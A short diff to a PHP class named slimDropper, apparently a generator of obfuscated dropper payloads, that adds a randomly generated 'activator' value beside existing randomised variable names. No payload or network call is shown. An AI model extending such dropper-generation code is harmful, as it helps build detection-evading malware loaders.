@@ -36,6 +36,7 @@ class slimDropper
         $this->random_uuid_var = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
         $this->random_var = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
         $this->random_var_second = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
+        $this->activator = bin2hex(openssl_random_pseudo_bytes(25));
     }
 
     function generateDropper(): array
